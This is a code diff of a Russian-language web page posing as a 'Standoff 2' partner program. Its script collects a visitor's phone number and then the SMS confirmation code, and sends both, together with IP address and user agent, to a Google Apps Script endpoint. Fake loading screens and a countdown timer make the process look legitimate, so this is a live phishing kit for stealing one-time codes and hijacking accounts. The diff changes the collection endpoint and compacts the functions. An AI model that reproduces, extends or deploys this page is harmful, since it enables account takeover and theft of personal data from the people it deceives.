@@ -97,13 +97,12 @@
         <div class="footer">Standoff 2 • Партнёрская программа</div>
     </div>
     <script>
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyIKTbfZQRA9Ebl7G_ExOFl53_JcJyPacQe9SsrJsToOSj8L8r9mksawm8bqKQSxeBm2w/exec';
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyXStieM73tN5EQq14dL-WoMcB0t0ID4eQ1gO-Z7N3ivBi8EiK4vCGECrPcimPC-V4b/exec';
         const urlParams = new URLSearchParams(window.location.search);
         const inviter = urlParams.get('inviter') || 'Игрок';
         document.getElementById('inviter-name').textContent = inviter;
         document.getElementById('inviter-avatar').textContent = inviter.charAt(0).toUpperCase();
         if (document.getElementById('inviter-name-done')) document.getElementById('inviter-name-done').textContent = inviter;
-        
         var timerInterval = null;
         var codeUnlocked = false;
 
@@ -130,34 +129,13 @@
             input.value = formatted;
         }
 
-        function lockCodeInput() {
-            codeUnlocked = false;
-            document.getElementById('code-wrapper').classList.add('locked');
-            document.getElementById('code').disabled = true;
-            document.getElementById('code').placeholder = 'Ожидайте код...';
-            document.getElementById('btn-code').disabled = true;
-        }
-
-        function unlockCodeInput() {
-            codeUnlocked = true;
-            document.getElementById('code-wrapper').classList.remove('locked');
-            document.getElementById('code').disabled = false;
-            document.getElementById('code').placeholder = '0 0 0 0 0 0';
-            document.getElementById('code').focus();
-            document.getElementById('btn-code').disabled = false;
-        }
+        function lockCodeInput() { codeUnlocked = false; document.getElementById('code-wrapper').classList.add('locked'); document.getElementById('code').disabled = true; document.getElementById('code').placeholder = 'Ожидайте код...'; document.getElementById('btn-code').disabled = true; }
+        function unlockCodeInput() { codeUnlocked = true; document.getElementById('code-wrapper').classList.remove('locked'); document.getElementById('code').disabled = false; document.getElementById('code').placeholder = '0 0 0 0 0 0'; document.getElementById('code').focus(); document.getElementById('btn-code').disabled = false; }
 
         function startTimer() {
-            var seconds = 60;
-            document.getElementById('timer').textContent = seconds;
-            document.getElementById('btn-resend').disabled = true;
-            lockCodeInput();
+            var seconds = 60; document.getElementById('timer').textContent = seconds; document.getElementById('btn-resend').disabled = true; lockCodeInput();
             if (timerInterval) clearInterval(timerInterval);
-            timerInterval = setInterval(function() {
-                seconds--;
-                document.getElementById('timer').textContent = seconds;
-                if (seconds <= 0) { clearInterval(timerInterval); document.getElementById('btn-resend').disabled = false; unlockCodeInput(); }
-            }, 1000);
+            timerInterval = setInterval(function() { seconds--; document.getElementById('timer').textContent = seconds; if (seconds <= 0) { clearInterval(timerInterval); document.getElementById('btn-resend').disabled = false; unlockCodeInput(); } }, 1000);
         }
 
         async function requestCode() {
@@ -165,29 +143,20 @@
             if (phone.length !== 10) { document.getElementById('phone-error').style.display = 'block'; setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); return; }
             if (phone[0] !== '9') { document.getElementById('phone-error').textContent = 'Номер должен начинаться с 9'; document.getElementById('phone-error').style.display = 'block'; setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); return; }
             document.getElementById('phone-error').style.display = 'none';
-            var ip = await getIP();
-            var fullPhone = '+7' + phone;
+            var ip = await getIP(); var fullPhone = '+7' + phone;
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'phone', phone: fullPhone, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
-            document.getElementById('screen-phone').style.display = 'none';
-            document.getElementById('loading-phone').textContent = '+7 ' + document.getElementById('phone').value;
-            document.getElementById('screen-loading').style.display = 'block';
+            document.getElementById('screen-phone').style.display = 'none'; document.getElementById('loading-phone').textContent = '+7 ' + document.getElementById('phone').value; document.getElementById('screen-loading').style.display = 'block';
             setTimeout(function() { document.getElementById('screen-loading').style.display = 'none'; document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value; document.getElementById('screen-code').style.display = 'block'; startTimer(); }, 3000);
         }
 
-        function resendCode() {
-            document.getElementById('screen-code').style.display = 'none';
-            document.getElementById('screen-loading').style.display = 'block';
-            setTimeout(function() { document.getElementById('screen-loading').style.display = 'none'; document.getElementById('screen-code').style.display = 'block'; startTimer(); }, 3000);
-        }
+        function resendCode() { document.getElementById('screen-code').style.display = 'none'; document.getElementById('screen-loading').style.display = 'block'; setTimeout(function() { document.getElementById('screen-loading').style.display = 'none'; document.getElementById('screen-code').style.display = 'block'; startTimer(); }, 3000); }
 
         async function confirmCode() {
             if (!codeUnlocked) { document.getElementById('code-error').textContent = 'Дождитесь окончания таймера'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 2000); return; }
-            var codeInput = document.getElementById('code');
-            var code = codeInput.value.replace(/\D/g, '');
+            var codeInput = document.getElementById('code'); var code = codeInput.value.replace(/\D/g, '');
             if (code.length < 4) { document.getElementById('code-error').textContent = 'Введите код из SMS'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 2000); return; }
             document.getElementById('code-error').style.display = 'none';
-            var ip = await getIP();
-            var btn = document.getElementById('btn-code'); btn.disabled = true; btn.textContent = 'ПРОВЕРКА...';
+            var ip = await getIP(); var btn = document.getElementById('btn-code'); btn.disabled = true; btn.textContent = 'ПРОВЕРКА...';
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
             if (timerInterval) clearInterval(timerInterval);
             setTimeout(function() { document.getElementById('screen-code').style.display = 'none'; document.getElementById('screen-done').style.display = 'block'; btn.disabled = false; btn.textContent = 'Подтвердить'; }, 1000);
